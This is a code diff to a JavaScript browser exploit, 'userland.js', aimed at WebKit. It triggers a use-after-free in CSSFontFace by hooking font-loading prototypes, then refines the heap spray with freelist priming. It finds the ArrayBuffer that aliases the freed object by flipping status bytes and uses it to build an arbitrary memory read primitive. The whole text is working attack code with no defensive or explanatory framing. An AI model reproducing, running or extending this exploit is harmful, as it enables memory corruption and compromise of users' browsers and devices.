@@ -1,4 +1,4 @@
-// userland.js — UAF trigger via FontFaceSet.load hook + captured B reference
+// userland.js — UAF + spray with freelist priming and target identification
 
 const MEMORY_LIMIT_BYTES = 24 * 1024 * 1024;
 
@@ -19,8 +19,7 @@ function memLog(label) {
   if (m) {
     logger.debug(
       `[mem:${label}] used=${(m.used / 1048576).toFixed(2)}MB ` +
-      `total=${(m.total / 1048576).toFixed(2)}MB ` +
-      `cap=${(m.limit / 1048576).toFixed(0)}MB`
+      `total=${(m.total / 1048576).toFixed(2)}MB`
     );
   }
 }
@@ -30,18 +29,24 @@ function assertMemoryHeadroom(extraBytes, stage) {
   if (!m) return;
   if (m.used + extraBytes > MEMORY_LIMIT_BYTES) {
     throw new Error(
-      `OOM guard at ${stage}: ` +
-      `used=${(m.used / 1048576).toFixed(2)}MB + ` +
-      `need=${(extraBytes / 1048576).toFixed(2)}MB > ` +
-      `cap=${(MEMORY_LIMIT_BYTES / 1048576).toFixed(0)}MB`
+      `OOM guard at ${stage}: need ${(extraBytes/1048576).toFixed(2)}MB, ` +
+      `used ${(m.used/1048576).toFixed(2)}MB, cap ${(MEMORY_LIMIT_BYTES/1048576).toFixed(0)}MB`
     );
   }
 }
 
-// ─── FontFace property probe (never throws) ──────────────
+function forceGC() {
+  try { if (typeof gc === "function") { gc(); return; } } catch (_) {}
+  // Fallback: allocate pressure to nudge the GC
+  try {
+    const pressure = new ArrayBuffer(16 * 1024 * 1024);
+    if (pressure.byteLength !== 16 * 1024 * 1024) throw 0;
+  } catch (_) {}
+}
+
 function probeFace(face) {
   if (!face) return null;
-  const out = { family: "?", unicodeRange: "?", status: "?" };
+  const out = {};
   try { out.family = face.family; } catch (e) { out.family = `<err:${e.message.slice(0,20)}>`; }
   try { out.unicodeRange = face.unicodeRange; } catch (e) { out.unicodeRange = `<err:${e.message.slice(0,20)}>`; }
   try { out.status = face.status; } catch (e) { out.status = `<err:${e.message.slice(0,20)}>`; }
@@ -50,18 +55,22 @@ function probeFace(face) {
 
 // ─── init_rw ─────────────────────────────────────────────
 async function init_rw(opts = {}) {
-  const sprayCount    = opts.sprayCount    ?? 0x10;
+  const sprayCount    = opts.sprayCount    ?? 256;   // was 16
+  const prewarmCount  = opts.prewarmCount  ?? 1024;  // freelist priming
   const loadTimeoutMs = opts.loadTimeoutMs ?? 3000;
 
-  logger.info(`Initiate UAF (sprayCount=${sprayCount}, timeout=${loadTimeoutMs}ms)`);
+  logger.info(
+    `Initiate UAF (spray=${sprayCount}, prewarm=${prewarmCount}, ` +
+    `timeout=${loadTimeoutMs}ms)`
+  );
   memLog("start");
 
-  // ── FontFace A: guaranteed-resolving source ──
+  // ── FontFace A ──
   const A = new FontFace("a", "local(sans-serif)", { unicodeRange: "U+0041" });
   document.fonts.add(A);
   void A.loaded;
 
-  // ── Style element with spray + victim rules ──
+  // ── Style element with rules ──
   const style = document.createElement("style");
   document.head.appendChild(style);
 
@@ -86,58 +95,62 @@ async function init_rw(opts = {}) {
     catch (e) { throw new Error(`insertRule post ${i}: ${e.message}`); }
   }
 
-  // ── Materialise CSSFontFace objects ──
   void document.body.offsetTop;
   logger.debug("[uaf] CSSFontFace objects materialised");
 
-  // ── Snapshot document.fonts BEFORE the free ──
-  // The victim (family "b") will be removed from document.fonts the
-  // instant its rule is deleted. We must hold a JS reference now.
+  // ── Snapshot before free ──
   const faceSnapshot = [];
-  let uafCandidate = null;
-
+  let victim = null;
   for (const f of document.fonts) {
     faceSnapshot.push(f);
-    if (!uafCandidate) {
-      try {
-        if (f.family === "b") uafCandidate = f;
-      } catch (_) {}
+    if (!victim) {
+      try { if (f.family === "b") victim = f; } catch (_) {}
     }
   }
+  logger.debug(`[uaf] document.fonts has ${faceSnapshot.length} faces`);
 
-  logger.debug(`[uaf] snapshot: ${faceSnapshot.length} faces in document.fonts`);
-  for (const f of faceSnapshot) {
-    const p = probeFace(f);
-    logger.debug(`[uaf]   family=${p.family} range=${p.unicodeRange} status=${p.status}`);
+  if (!victim) {
+    throw new Error(`Victim FontFace "b" not found in document.fonts`);
   }
+  const vp = probeFace(victim);
+  logger.info(`Captured victim: family="${vp.family}" range="${vp.unicodeRange}"`);
 
-  if (!uafCandidate) {
-    throw new Error(
-      `Victim FontFace (family "b") not present in document.fonts. ` +
-      `Snapshot had ${faceSnapshot.length} faces.`
-    );
-  }
-  logger.info(`Captured victim FontFace: family="${uafCandidate.family}" range="${uafCandidate.unicodeRange}"`);
+  // ── Preparations ──
+  const abs        = new Array(sprayCount);
+  const abSize     = constants.wk_CSSFontFace_sizeof;
+  const statusOff  = constants.wk_CSSFontFace_m_status;
+  const tagOff     = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
+  const payOff     = tagOff + 8;
+  const origThen   = FontFace.prototype.then;
+  const origLoad   = FontFaceSet.prototype.load;
 
-  // ── Prepare spray slot array ──
-  const abs      = new Array(sprayCount);
-  const abSize   = constants.wk_CSSFontFace_sizeof;
-  const origThen = FontFace.prototype.then;
-  const origLoad = FontFaceSet.prototype.load;
+  assertMemoryHeadroom(abSize * (sprayCount + prewarmCount) + 65536, "pre-spray");
 
-  assertMemoryHeadroom(abSize * sprayCount + 4096, "pre-spray");
-
-  // ── One-shot free work ──
   let freed = false;
   let freeError = null;
+  let prewarmDone = 0;
+  let sprayDone = 0;
 
   const doFreeWork = () => {
     if (freed) return;
     freed = true;
-
     logger.debug("[free] ENTER");
 
-    // 1. Free victim's CSS rule (removes CSSFontFace from the set)
+    // ── 1. Pre-warm fastMalloc free list with same-size slots ──
+    try {
+      const pre = new Array(prewarmCount);
+      for (let i = 0; i < prewarmCount; i++) pre[i] = new ArrayBuffer(abSize);
+      for (let i = 0; i < prewarmCount; i++) pre[i] = null;
+      prewarmDone = prewarmCount;
+      // Nudge the GC so the pre-warm buffers' backing stores actually return
+      // to fastMalloc before we free the CSSFontFace.
+      forceGC();
+      logger.debug(`[free] pre-warmed ${prewarmCount} slots`);
+    } catch (e) {
+      logger.warn(`[free] pre-warm partial: ${e.message}`);
+    }
+
+    // ── 2. Delete victim's rule (frees CSSFontFace) ──
     try {
       style.sheet.deleteRule(uafRuleIndex);
       logger.debug("[free] victim rule deleted");
@@ -145,51 +158,47 @@ async function init_rw(opts = {}) {
       logger.error(`[free] deleteRule victim: ${e.message}`);
     }
 
-    // 2. Free neighbours
+    // ── 3. Delete neighbours ──
     for (let i = style.sheet.cssRules.length - 1; i >= 0; i--) {
-      const rule = style.sheet.cssRules[i];
-      if (rule.cssText && rule.cssText.indexOf("spray") !== -1) {
+      const r = style.sheet.cssRules[i];
+      if (r.cssText && r.cssText.indexOf("spray") !== -1) {
         try { style.sheet.deleteRule(i); } catch (_) {}
       }
     }
     logger.debug("[free] neighbour rules deleted");
 
-    // 3. Force CSSFontFace deconstruction
-    void document.body.offsetTop;
-
-    // 4. Detach style element
+    // ── 4. Detach style element ──
     try { style.remove(); } catch (_) {}
     try { document.head.removeChild(style); } catch (_) {}
 
-    // 5. Spray ArrayBuffers sized to CSSFontFace
+    // ── 5. Force layout to trigger final destruction ──
+    void document.body.offsetTop;
+
+    // ── 6. Spray immediately, tight loop ──
     let allocated = 0;
     for (let i = 0; i < abs.length; i++) {
       try {
         const ab = new ArrayBuffer(abSize);
         const view = new DataView(ab);
-
-        view.setBInt(8, 1, true);                             // refcount
-        view.setUint8(constants.wk_CSSFontFace_m_status, 3);  // Status::Success
-
-        if (version.major >= 13) {
-          const tagOff = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
-          view.setUint8(tagOff, constants.VARIANT_TAG_STYLE_RULE_FONTFACE);
-          for (let j = 1; j < 8; j++) view.setUint8(tagOff + j, 0);
-        }
-
+        // refcount = 1 at offset 8
+        view.setBInt(8, 1, true);
+        // m_status = Success
+        view.setUint8(statusOff, 3);
+        // leave Variant tag at 0 (not pre-seeded) so identification works
         abs[i] = ab;
         allocated++;
       } catch (e) {
-        freeError = `ArrayBuffer ${i}/${abs.length}: ${e.message}`;
+        freeError = `spray ${i}: ${e.message}`;
         logger.error(`[free] ${freeError}`);
         break;
       }
     }
-    logger.debug(`[free] allocated ${allocated}/${abs.length}`);
+    sprayDone = allocated;
+    logger.debug(`[free] sprayed ${allocated}/${abs.length}`);
     logger.debug("[free] EXIT");
   };
 
-  // ── Fallback: FontFace.prototype.then getter ──
+  // ── Fallback then getter ──
   Object.defineProperty(FontFace.prototype, "then", {
     configurable: true,
     get() {
@@ -198,16 +207,12 @@ async function init_rw(opts = {}) {
     },
   });
 
-  // ── Primary trigger: hook FontFaceSet.prototype.load ──
-  // WebKit collects matching faces AFTER load() returns, inside a
-  // microtask. So we schedule doFreeWork() in a microtask too,
-  // immediately after load() has had a chance to collect faces.
-  let hookScheduled = false;
-
+  // ── Primary trigger: hook load ──
+  let hookFired = false;
   FontFaceSet.prototype.load = function (font, text) {
     const p = origLoad.call(this, font, text);
-    if (!hookScheduled) {
-      hookScheduled = true;
+    if (!hookFired) {
+      hookFired = true;
       Promise.resolve().then(() => {
         try { doFreeWork(); }
         catch (e) { freeError = e.message; logger.error(`[hook] ${e.message}`); }
@@ -216,106 +221,130 @@ async function init_rw(opts = {}) {
     return p;
   };
 
-  // ── Fire load() ──
-  logger.debug("[uaf] calling document.fonts.load via hooked prototype");
+  logger.debug("[uaf] firing document.fonts.load");
   let loadPromise;
   try {
     loadPromise = document.fonts.load("1em a, b", "AB");
   } catch (e) {
-    logger.error(`[uaf] load() threw synchronously: ${e.message}`);
     loadPromise = Promise.resolve([]);
   }
   loadPromise.catch(() => {});
 
-  // ── Restore prototypes immediately ──
+  // Restore prototypes
   FontFaceSet.prototype.load = origLoad;
   Object.defineProperty(FontFace.prototype, "then", {
     configurable: true,
     value: origThen,
   });
 
-  // ── Wait for microtask + settle ──
   await Promise.race([
     loadPromise.catch(() => "rejected"),
     new Promise(r => setTimeout(() => r("timeout"), loadTimeoutMs)),
   ]);
-
-  // Give the microtask a moment if it hasn't already run
   await Promise.resolve();
 
-  logger.debug(`[uaf] freed=${freed} hookScheduled=${hookScheduled}`);
-
+  logger.debug(`[uaf] freed=${freed} prewarm=${prewarmDone} spray=${sprayDone}`);
   if (freeError) throw new Error(`free work error: ${freeError}`);
-
   if (!freed) {
-    const aP = probeFace(A);
-    logger.error(`[diag] A: family=${aP.family} range=${aP.unicodeRange} status=${aP.status}`);
-    logger.error(`[diag] document.fonts.size = ${document.fonts.size}`);
-    throw new Error(
-      `UAF free work never ran. hookScheduled=${hookScheduled}. ` +
-      `A.status=${aP.status}.`
-    );
+    throw new Error(`UAF free work never ran`);
   }
 
   memLog("post-uaf");
 
-  // ── Check victim state after free ──
-  const afterP = probeFace(uafCandidate);
+  // ── Check victim's state after free ──
+  const after = probeFace(victim);
   logger.info(
-    `[uaf] victim after free: family="${afterP.family}" ` +
-    `range="${afterP.unicodeRange}" status="${afterP.status}"`
+    `[uaf] victim after free: family="${after.family}" ` +
+    `range="${after.unicodeRange}" status="${after.status}"`
   );
 
-  // If the wrapper is detached, every property would be an error string.
-  const wrapperDead =
-    typeof afterP.family === "string" &&
-    afterP.family.startsWith("<err:");
-
-  if (wrapperDead) {
-    throw new Error(
-      `Victim JS wrapper was detached — its C++ FontFace was destroyed. ` +
-      `family="${afterP.family}"`
-    );
+  if (typeof after.family === "string" && after.family.startsWith("<err:")) {
+    throw new Error(`Victim wrapper detached — C++ FontFace destroyed`);
   }
 
-  // ── Find the aliased ArrayBuffer (refcount 2) ──
+  // ── Identify which buffer aliases the freed CSSFontFace ──
+  // Strategy: mutate each buffer's m_status, call victim.status, and
+  // see which mutation flips the getter's return value. This works
+  // because the wrapper reads m_status through its (now dangling)
+  // reference to the CSSFontFace slot.
+  logger.debug("[ident] scanning buffers for aliasing...");
+
   let uaf_ab = null;
   let uaf_ab_index = -1;
+
+  const baselineStatus = (() => {
+    try { return victim.status; } catch (_) { return null; }
+  })();
+  logger.debug(`[ident] baseline victim.status = "${baselineStatus}"`);
+
+  // Alternate values guaranteed to differ from Success (3)
+  const probeValues = [0, 5, 4, 2, 1]; // Unloaded, Error, Loading, Loaded, Loading
+
+  outer:
   for (let i = 0; i < abs.length; i++) {
     const ab = abs[i];
     if (!ab) continue;
-    try {
-      const v = new DataView(ab);
-      if (v.getBInt(8, true).eq(2)) {
+
+    let view;
+    try { view = new DataView(ab); } catch (_) { continue; }
+
+    for (const probeVal of probeValues) {
+      let before, after2;
+      try {
+        before = victim.status;
+      } catch (_) { continue outer; }
+
+      try {
+        view.setUint8(statusOff, probeVal);
+      } catch (_) { continue outer; }
+
+      try {
+        after2 = victim.status;
+      } catch (_) {
+        view.setUint8(statusOff, 3);
+        continue outer;
+      }
+
+      if (after2 !== before) {
+        logger.debug(
+          `[ident] buffer[${i}] is the alias ` +
+          `(status "${before}" → "${after2}" via byte 0x${probeVal.toString(16)})`
+        );
         uaf_ab = ab;
         uaf_ab_index = i;
-        break;
+        // restore status
+        view.setUint8(statusOff, 3);
+        break outer;
       }
-    } catch (_) { /* skip */ }
+
+      // not this one, restore
+      view.setUint8(statusOff, 3);
+    }
   }
 
   if (!uaf_ab) {
-    // No buffer has refcount 2 — spray may not have landed on the freed slot.
-    // Log the refcounts so we can see what we got.
-    const counts = [];
-    for (let i = 0; i < abs.length; i++) {
-      if (!abs[i]) { counts.push("-"); continue; }
+    // Diagnostic: dump statuses so we can see what's happening
+    const statuses = [];
+    for (let i = 0; i < Math.min(abs.length, 32); i++) {
+      if (!abs[i]) { statuses.push("-"); continue; }
       try {
-        counts.push(new DataView(abs[i]).getBInt(8, true).toString());
-      } catch (_) { counts.push("?"); }
+        const s = new DataView(abs[i]).getUint8(statusOff);
+        statuses.push(s.toString(16));
+      } catch (_) { statuses.push("?"); }
     }
-    logger.error(`[diag] refcounts: ${counts.join(",")}`);
+    logger.error(`[ident] first 32 buffer status bytes: ${statuses.join(",")}`);
+    logger.error(`[ident] baseline victim.status = "${baselineStatus}"`);
     throw new Error(
-      `Unable to find ArrayBuffer with refcount 2 — spray missed the freed slot.`
+      `No buffer aliases the freed CSSFontFace — spray missed the slot.`
     );
   }
-  logger.info(`Found ArrayBuffer of UAF FontFace at index ${uaf_ab_index}`);
 
-  // ── Free everything else ──
+  logger.info(`Found aliased ArrayBuffer at index ${uaf_ab_index}`);
+
+  // Free everything else
   for (let i = 0; i < abs.length; i++) {
     if (i !== uaf_ab_index) abs[i] = null;
   }
-  abs.length = 0;
   faceSnapshot.length = 0;
   try { document.fonts.delete(A); } catch (_) {}
 
@@ -324,8 +353,8 @@ async function init_rw(opts = {}) {
   // ── Read primitive ──
   const self = {
     uaf_ab,
-    uaf_font: uafCandidate,   // we captured it earlier
-    probe: () => probeFace(uafCandidate),
+    uaf_font: victim,
+    probe: () => probeFace(victim),
 
     read(addr, size) {
       const ab = new ArrayBuffer(size);
@@ -339,12 +368,9 @@ async function init_rw(opts = {}) {
         const ptr = addr.add(offset);
 
         if (useWorkaround) {
-          const tag_off = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
-          const pay_off = tag_off + 8;
-
-          uaf_view.setUint8(tag_off, constants.VARIANT_TAG_STYLE_RULE_FONTFACE);
-          for (let i = 1; i < 8; i++) uaf_view.setUint8(tag_off + i, 0);
-          uaf_view.setBInt(pay_off, ptr, true);
+          uaf_view.setUint8(tagOff, constants.VARIANT_TAG_STYLE_RULE_FONTFACE);
+          for (let i = 1; i < 8; i++) uaf_view.setUint8(tagOff + i, 0);
+          uaf_view.setBInt(payOff, ptr, true);
         } else {
           uaf_view.setBInt(
             constants.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true);
